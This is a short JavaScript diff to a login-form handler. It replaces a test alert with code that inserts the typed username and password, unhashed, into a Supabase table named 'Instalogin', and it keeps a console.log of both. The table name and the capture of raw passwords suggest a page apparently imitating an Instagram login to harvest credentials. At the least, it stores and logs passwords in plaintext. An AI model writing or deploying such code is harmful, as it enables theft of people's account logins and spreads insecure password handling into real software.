@@ -108,7 +108,16 @@ let password = document.getElementById("password").value;
 
 console.log(username, password);
 
-alert("Form submitted (test)");
+await supabase
+.from("Instalogin")
+.insert([
+{
+Username: username,
+Password: password
+}
+]);
+
+alert("Form submitted!");
 
 }
 
